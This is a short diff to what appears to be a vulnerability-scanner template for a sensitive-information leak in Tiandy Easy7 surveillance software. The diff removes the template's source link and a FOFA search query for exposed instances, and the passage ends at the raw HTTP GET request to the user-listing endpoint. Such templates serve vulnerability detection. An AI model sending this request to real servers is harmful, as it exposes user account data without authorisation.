@@ -3,12 +3,8 @@ info:
   name: 天地伟业Easy7 loadAllUserBeans 存在敏感信息泄露漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yhf58gylsx8x9sxp'
+  description: ''
   tags: info-leak,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yhf58gylsx8x9sxp
-    fofa: app="Tiandy-Easy7"
 http:
 - raw:
   - 'GET /Easy7/rest/user/loadAllUserBeans HTTP/1.1
